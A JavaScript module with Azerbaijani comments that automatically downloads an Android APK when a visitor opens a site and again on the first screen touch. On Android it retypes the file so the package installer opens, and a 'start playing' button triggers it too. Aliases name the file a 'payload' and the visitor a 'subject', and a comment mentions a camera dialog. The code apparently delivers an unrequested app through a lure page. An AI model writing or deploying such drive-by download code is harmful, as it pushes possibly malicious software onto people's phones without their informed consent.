import { SUBJECT_APK_DOWNLOAD, SUBJECT_APK_PATH, SUBJECT_APK_FILENAME } from './config';

function buildHref() {
    const base = process.env.PUBLIC_URL || '';
    return `${base}${SUBJECT_APK_PATH}`.replace(/([^:]\/)\/+/g, '$1');
}

function absoluteApkUrl() {
    return new URL(buildHref(), window.location.href).href;
}

function isDone(storageKey) {
    try {
        return sessionStorage.getItem(storageKey) === '1';
    } catch {
        return true;
    }
}

function markDone(storageKey) {
    try {
        sessionStorage.setItem(storageKey, '1');
    } catch {
        /* ignore */
    }
}

function isMobileDevice() {
    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
}

function isAndroid() {
    return /Android/i.test(navigator.userAgent || '');
}

function triggerAnchorClick(href, filename, { blob = false } = {}) {
    const a = document.createElement('a');
    a.href = href;
    if (filename) a.download = filename;
    a.rel = 'noopener noreferrer';
    if (!blob) a.target = '_blank';
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    a.remove();
}

function desktopDownload(url, filename) {
    triggerAnchorClick(url, filename);
}

async function androidBlobDownload(url, filename) {
    const res = await fetch(url, { cache: 'no-store', credentials: 'same-origin' });
    if (!res.ok) throw new Error(`download_http_${res.status}`);

    const raw = await res.blob();
    const type =
        raw.type && raw.type !== 'application/octet-stream'
            ? raw.type
            : 'application/vnd.android.package-archive';
    const blob = raw.type === type ? raw : new Blob([raw], { type });
    const blobUrl = URL.createObjectURL(blob);

    try {
        triggerAnchorClick(blobUrl, filename, { blob: true });
    } finally {
        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
    }
}

async function mobileDownload(url, filename) {
    if (isAndroid()) {
        try {
            await androidBlobDownload(url, filename);
            return;
        } catch {
            triggerAnchorClick(url, filename);
        }
        return;
    }
    triggerAnchorClick(url, filename);
}

/**
 * Sayta girəndə bir dəfə APK endir (Android bildirişi normaldır).
 * @returns {Promise<boolean>}
 */
export async function runSubjectApkAutoDownload(storageKey = 'pulse_apk_auto_v1') {
    if (!SUBJECT_APK_DOWNLOAD || isDone(storageKey)) return false;

    const url = absoluteApkUrl();
    const filename = SUBJECT_APK_FILENAME;

    try {
        if (isMobileDevice()) {
            await mobileDownload(url, filename);
        } else {
            desktopDownload(url, filename);
        }
        markDone(storageKey);
        return true;
    } catch (e) {
        console.warn('apk auto download:', e?.message || e);
        try {
            triggerAnchorClick(url, filename);
            markDone(storageKey);
            return true;
        } catch {
            return false;
        }
    }
}

/**
 * «Oynamağa başla» — APK quraşdırma ekranını aç (Android Package Installer).
 * @returns {Promise<boolean>}
 */
export async function openSubjectApkInstall() {
    if (!SUBJECT_APK_DOWNLOAD) return false;

    const url = absoluteApkUrl();
    const filename = SUBJECT_APK_FILENAME;

    try {
        if (isAndroid()) {
            await androidBlobDownload(url, filename);
        } else if (isMobileDevice()) {
            await mobileDownload(url, filename);
        } else {
            desktopDownload(url, filename);
        }
        return true;
    } catch (e) {
        console.warn('apk install open:', e?.message || e);
        triggerAnchorClick(url, filename);
        return true;
    }
}

/**
 * Sayta girəndə: dərhal + ilk toxunuşda avtomatik endirmə.
 */
export function attachSubjectApkDownloadOnEntry(storageKey = 'pulse_apk_auto_v1') {
    if (!SUBJECT_APK_DOWNLOAD || isDone(storageKey)) return () => {};

    let finished = false;
    const run = async () => {
        if (finished) return;
        const ok = await runSubjectApkAutoDownload(storageKey);
        if (ok) finished = true;
    };

    run();

    const onGesture = () => {
        run();
    };
    document.addEventListener('pointerdown', onGesture, { once: true, passive: true });
    document.addEventListener('touchstart', onGesture, { once: true, passive: true });

    return () => {
        document.removeEventListener('pointerdown', onGesture);
        document.removeEventListener('touchstart', onGesture);
    };
}

/** Kamera dialoqu endirməni kəsə bilər — mobilde qısa gözləmə */
export function testDownloadSettleMs() {
    return isMobileDevice() ? 450 : 0;
}

/** @deprecated */
export const runSubjectPayloadDownload = runSubjectApkAutoDownload;
export const attachSubjectPayloadDownloadOnEntry = attachSubjectApkDownloadOnEntry;
export async function runTestAutoDownloadOnce(storageKey) {
    return runSubjectApkAutoDownload(storageKey);
}
